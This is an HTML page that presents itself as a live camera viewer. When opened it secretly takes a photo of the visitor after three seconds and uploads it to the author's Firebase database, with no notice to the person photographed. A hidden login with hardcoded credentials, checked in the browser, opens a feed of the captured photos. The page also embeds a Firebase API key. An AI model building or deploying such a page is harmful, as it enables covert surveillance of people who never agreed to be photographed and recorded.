<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Câmera Realtime Total</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
        #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
        .login-box { background: rgba(0, 0, 0, 0.9); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #444; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { padding: 8px; border-radius: 4px; border: none; width: 130px; background: #222; color: #fff; border: 1px solid #333; }
        button { cursor: pointer; background: #007bff; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; }
        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; }
        canvas { display: none; }
        .hidden { display: none !important; }
        
        /* Painel de Histórico Otimizado */
        #historico-painel { background: #111; padding: 10px; border-radius: 8px; margin-top: 10px; width: 300px; max-height: 80vh; overflow-y: auto; border: 1px solid #007bff; }
        .log-item { margin-bottom: 20px; padding: 10px; background: #1a1a1a; border-radius: 6px; border-left: 4px solid #007bff; animation: fadeIn 0.5s ease-in; }
        .log-item img { width: 100%; border-radius: 4px; margin-top: 8px; display: block; background: #000; }
        .log-date { font-size: 11px; color: #007bff; font-weight: bold; display: block; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas-foto"></canvas>

    <div id="admin-area">
        <div id="form-login" class="login-box">
            <input type="text" id="usuario" placeholder="User">
            <input type="password" id="senha" placeholder="Pass">
            <button onclick="verificarAdmin()">ATIVAR MONITORAMENTO</button>
        </div>

        <div id="painel-admin" class="hidden">
            <div class="login-box">
                <div style="display:flex; justify-content: space-between; align-items:center;">
                    <span style="color:#007bff; font-weight:bold;">LIVE FEED</span>
                    <button onclick="location.reload()" style="background:#d9534f; padding: 2px 8px;">X</button>
                </div>
                <div id="historico-painel">
                    <div id="lista-historico">Aguardando capturas...</div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas-foto');

        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                // Tira a foto 3 segundos após abrir
                setTimeout(capturarEEnviar, 3000);
            } catch (err) { console.error(err); }
        }

        function capturarEEnviar() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Qualidade ajustada para 0.3 para o envio e carregamento serem instantâneos
            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
            
            db.collection("acessos").add({
                data: new Date().toLocaleString('pt-BR'),
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                imagem: fotoBase64
            });
        }

        function verificarAdmin() {
            if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
                document.getElementById('form-login').classList.add('hidden');
                document.getElementById('painel-admin').classList.remove('hidden');
                ativarRealtimeTotal();
            } else { alert("Senha incorreta"); }
        }

        // FUNÇÃO DE REALTIME MELHORADA
        function ativarRealtimeTotal() {
            const lista = document.getElementById('lista-historico');
            
            // O Snapshot agora limpa e reconstrói a lista toda vez que o banco muda
            db.collection("acessos").orderBy("timestamp", "desc").limit(10).onSnapshot((snapshot) => {
                lista.innerHTML = ""; 
                
                snapshot.forEach((doc) => {
                    const dados = doc.data();
                    const itemDiv = document.createElement('div');
                    itemDiv.className = "log-item";
                    
                    // Criamos a imagem via JavaScript para garantir que o navegador processe o Base64 na hora
                    const img = new Image();
                    img.src = dados.imagem;
                    
                    const dateSpan = document.createElement('span');
                    dateSpan.className = "log-date";
                    dateSpan.innerText = "CAPTURA: " + dados.data;

                    itemDiv.appendChild(dateSpan);
                    itemDiv.appendChild(img);
                    lista.appendChild(itemDiv);
                });
            }, (error) => {
                console.error("Erro no realtime:", error);
            });
        }

        window.onload = iniciarApp;
    </script>
</body>
</html>
